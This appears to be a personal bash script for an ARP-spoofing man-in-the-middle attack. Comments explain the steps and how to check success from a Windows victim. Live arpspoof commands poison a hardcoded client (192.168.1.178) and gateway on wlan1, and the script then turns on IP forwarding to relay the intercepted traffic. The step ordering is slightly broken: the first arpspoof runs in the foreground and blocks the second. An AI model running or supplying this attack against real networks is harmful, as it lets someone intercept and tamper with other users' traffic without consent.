#!/bin/bash

# ARP = Address Resolution Protocol

# Man in the Middle Attack
# use 'managed' mode, not 'monitor' mode because we only want packets that are directed to our device

# You can confirm that attack worked by using 'arp -a' from Windows command line and 
# check if gateway mac address has changed to attacker's mac address

# echo 'What is your interface?'
# read interface

# echo 'What is the target IP?'
# read TIP

# echo 'What is the access point IP?'
# read APIP

# 1. tell client we are the Access Point (router)
# arpspoof -i $interface -t $TIP $APIP

# 2. tell the Access Point (router) we are the client
# arpspoof -i $interface -t $APIP $TIP

# 3. enable IP forward to allow packets to flow through our device without being dropped

arpspoof -i wlan1 -t 192.168.1.178 192.168.1.1 
arpspoof -i wlan1 -t 192.168.1.1 192.168.1.178 

echo 1 > /proc/sys/net/ipv4/ip_forward

